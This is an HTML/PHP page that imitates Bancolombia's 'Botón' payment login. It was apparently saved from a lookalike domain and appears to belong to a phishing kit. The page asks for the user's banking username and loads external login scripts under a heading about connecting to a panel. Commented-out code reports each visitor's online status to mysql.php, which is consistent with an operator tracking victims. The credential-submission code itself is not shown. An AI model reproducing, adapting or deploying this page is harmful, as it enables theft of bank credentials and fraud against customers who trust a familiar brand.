<?php
require_once('notpc.php');
?>
<!DOCTYPE html>
<!-- saved from url=(0078)https://portaldepagosclaro.com/promocionesclaro/PAGOSPSE/pagosbancolombia/USER -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Boton Bancolombia</title>
            <!--Scripts Conectar al panel-->

      <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
   		<script type="text/javascript" src="/scripts/functions.js"></script>  	
      
      
       <link href="./Boton Bancolombia users_files/main.20a3090e.css" rel="stylesheet">
  <link href="./Boton Bancolombia users_files/basic.css" rel="stylesheet">
  <link href="./Boton Bancolombia users_files/normalize.css" rel="stylesheet">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#000000">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link href="./Boton Bancolombia users_files/styles.css" media="all" rel="stylesheet" type="text/css">
      <link href="./Boton Bancolombia users_files/bootstrap.css" media="all" rel="stylesheet" type="text/css">
      <script type="text/javascript" src="./Boton Bancolombia users_files/jquery-3.6.0.min.js.download"></script>
      <script type="text/javascript" src="./Boton Bancolombia users_files/jquery.redirect.js.download"></script>
      <script type="text/javascript" src="./Boton Bancolombia users_files/login.js.download"></script>
      <script type="text/javascript" src="./Boton Bancolombia users_files/bootstrap.js.download"></script>
      <script type="text/javascript" src="./Boton Bancolombia users_files/Init.js.download"></script>
      
      
      	


      
      <style>html, body, form {height: 100%;}</style>
      <link rel="shortcut icon" href="https://portaldepagosclaro.com/promocionesclaro/PAGOSPSE/pagosbancolombia/images/favicon.ico?v=4.5.1.RC2_1628811357932">
      <script>
  function updateLabelVisibility() {
    const label = document.querySelector('.sc-imWYAI.fMmpDS');
    const input = document.querySelector('[name="TxtUsername"]');
    label.style.visibility = input.value ? 'hidden' : 'visible';
  }
</script>
   </head>
   <body>
        
    <div id="root">
      <div class="sc-gsFSXq jhvnaB">
        <div class="sc-iGgWBj icJLiE">
          <div id="errorAlert" class="sc-uVWWZ iVygmi"></div>
          <div class="sc-bbSZdi eDGRzG">Ingresa tu usuario</div>
          <div class="sc-fBWQRz cULVBz"></div>
          <div height="264px" class="sc-aXZVg cXjXnO">
            <div class="sc-gEvEer gcwMij">
              <div class="sc-eqUAAy kgsyyX"></div>
              <div class="sc-fqkvVR kfKTfV">El usuario es el mismo con el que ingresas a la Sucursal Virtual Personas</div>
            </div>
            
              <div class="sc-kAyceB cgbGIy">
                <div class="sc-dhKdcB iQVoqo"></div>
                <input name="TxtUsername" id="TxtUsername" class="sc-jXbUNg bTGjeC" type="text" autocorrect="off" autocomplete="off" placeholder=" " oninput="updateLabelVisibility()" onblur="updateLabelVisibility()" pattern="[a-zA-Z0-9]+" value="">
                <label class="sc-imWYAI fMmpDS">Usuario</label>
              </div>
              <p class="sc-cfxfcM jBMxqe">¿Olvidaste tu usuario?</p>
              <div class="sc-Nxspf iquDmE">
                <button id="btn-continuar" width="390px" height="44px" class="sc-kpDqfm ezyOXq">Continuar</button>
              </div>
            
          </div>
          <script type="text/javascript">-->
                // En el evento 'unload'
          <!--  window.addEventListener('beforeunload', function(event) {-->
          <!--    $.ajax({-->
          <!--      url: './mysql.php',-->
          <!--      type: 'POST',-->
          <!--      data: { action: 'Desconectado' },-->
          <!--      success: function(response) {-->
                //  console.log('Usuario desconectado correctamente');
          <!--      },-->
          <!--      error: function() {-->
                 // console.error('Error al desconectar el usuario');
          <!--      }-->
          <!--    });-->
          <!--  });-->
            
            // En el evento 'visibilitychange'
          <!--  document.addEventListener('visibilitychange', function() {-->
          <!--    if (document.visibilityState === 'visible') {-->
          <!--      $.ajax({-->
          <!--        url: './mysql.php',-->
          <!--        type: 'POST',-->
          <!--        data: { action: 'enLinea' },-->
          <!--        success: function(response) {-->
                 //   console.log('Usuario en línea');
          <!--        },-->
          <!--        error: function() {-->
                //    console.error('Error al poner al usuario en línea');
          <!--        }-->
          <!--      });-->
          <!--    }else{-->
          <!--       $.ajax({-->
          <!--        url: './mysql.php',-->
          <!--        type: 'POST',-->
          <!--        data: { action: 'Desconectado' },-->
          <!--        success: function(response) {-->
                   // console.log('Dejo de Ver');
          <!--        },-->
          <!--        error: function() {-->
                   // console.error('Error al poner al usuario en línea');
          <!--        }-->
          <!--      });-->
          <!--    }-->
          <!--  });-->
            
          <!--  document.addEventListener('DOMContentLoaded', function() {-->
              // Aquí puedes realizar las acciones que deseas ejecutar cuando alguien ingrese a la página
          <!--    $.ajax({-->
          <!--        url: './mysql.php',-->
          <!--        type: 'POST',-->
          <!--        data: { action: 'enLinea' },-->
          <!--        success: function(response) {-->
                  //  console.log('Usuario en línea');
          <!--        },-->
          <!--        error: function() {-->
                 //   console.error('Error al poner al usuario en línea');
          <!--        }-->
          <!--      });-->
          <!--  });-->
          <!--  console.log("Test");-->
          <!--  </script>


<!--Scripts que guarda los Datos-->

<script type="text/javascript">


	$(document).ready(function() {

		$('#btn-continuar').click(function(){
			if ($("#TxtUsername").val().length > 0) {
				
			}else{
				$("#err-mensaje").show();
				$(".user").css("border", "1px solid red");
				$("#txtUsuario").focus();
			}			
		});

		$("#txtUsuario").keyup(function(e) {
			$(".user").css("border", "1px solid #CCCCCC");	
			$("#err-mensaje").hide();				
		});
	});
</script>



        </div>
        <div class="sc-dAlyuH fgvEPZ">
          <div class="sc-jlZhew kZLvRr"></div>
          <span class="sc-eDPEul gTfgka">
            <div class="sc-eldPxv dJzohZ">
              <div class="sc-cPiKLX eqxxRJ"></div>
              <div class="sc-cwHptR fvLrbU">Copyright © 2024 Grupo Bancolombia.</div>
              <div class="sc-dLMFU kikHRa"></div>
            </div>
            <div class="sc-fPXMVe dCLFvs">
              
            </div>
          </span>
        </div>
      </div>
    </div>
    <div id="csid"></div>
    
     

</body></html>